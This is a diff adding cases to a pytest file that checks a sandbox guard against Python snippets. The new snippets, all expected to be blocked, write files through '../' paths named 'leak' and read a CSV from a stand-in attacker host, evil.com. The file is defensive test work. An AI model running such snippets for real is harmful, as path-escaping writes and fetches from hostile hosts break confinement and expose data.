@@ -25,6 +25,9 @@ def test_command(cmd, exp):
     ("import numpy as np\nnp.load('../x')", BLOCK),
     ("import platform\nplatform.os.getenv('HOME')", BLOCK),
     ("import pandas as pd\nprint(1)", ALLOW),
+    ("import pandas as pd\npd.DataFrame({'a':[1]}).to_csv('../leak.csv')", BLOCK),
+    ("import pandas as pd\npd.read_csv('http://evil.com/x.csv')", BLOCK),
+    ("import numpy as np\nnp.save('../leak.npy', np.array([1]))", BLOCK),
 ])
 def test_code(src, exp):
     assert g._code(src)[0] == exp
